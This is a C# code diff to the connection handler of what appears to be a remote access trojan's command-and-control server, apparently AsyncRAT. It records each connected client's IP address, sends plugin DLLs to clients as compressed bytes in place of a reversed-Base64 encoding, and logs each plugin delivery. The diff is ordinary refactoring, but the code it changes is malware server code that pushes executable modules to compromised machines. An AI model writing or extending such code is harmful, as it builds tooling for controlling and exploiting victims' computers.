@@ -29,10 +29,13 @@ namespace Server.Connection
         public object SendSync { get; set; }
         public long BytesRecevied { get; set; }
 
+        public string Ip { get; set; }
+
         public Clients(Socket socket)
         {
             SendSync = new object();
             TcpClient = socket;
+            Ip = TcpClient.RemoteEndPoint.ToString().Split(':')[0];
             SslClient = new SslStream(new NetworkStream(TcpClient, true), false);
             SslClient.BeginAuthenticateAsServer(Settings.ServerCertificate, false, SslProtocols.Tls, false, EndAuthenticate, null);
         }
@@ -153,7 +156,7 @@ namespace Server.Connection
                         }
                     }
                     catch { }
-                    new HandleLogs().Addmsg($"Client {TcpClient.RemoteEndPoint.ToString().Split(':')[0]} disconnected", Color.Red);
+                    new HandleLogs().Addmsg($"Client {Ip} disconnected", Color.Red);
                 }));
             }
 
@@ -228,16 +231,17 @@ namespace Server.Connection
                     {
                         MsgPack msgPack = new MsgPack();
                         msgPack.ForcePathObject("Packet").SetAsString("savePlugin");
-                        msgPack.ForcePathObject("Dll").SetAsString(Strings.StrReverse(Convert.ToBase64String(Zip.Compress(File.ReadAllBytes(plugin)))));
+                        msgPack.ForcePathObject("Dll").SetAsBytes(Zip.Compress(File.ReadAllBytes(plugin)));
                         msgPack.ForcePathObject("Hash").SetAsString(GetHash.GetChecksum(plugin));
                         ThreadPool.QueueUserWorkItem(Send, msgPack.Encode2Bytes());
+                        new HandleLogs().Addmsg($"Plugin {Path.GetFileName(plugin)} sent to client {Ip}", Color.Blue);
                         break;
                     }
                 }
             }
             catch (Exception ex)
             {
-                new HandleLogs().Addmsg($"Client {TcpClient.RemoteEndPoint.ToString().Split(':')[0]} {ex.Message}", Color.Red);
+                new HandleLogs().Addmsg($"Client {Ip} {ex.Message}", Color.Red);
             }
         }
     }
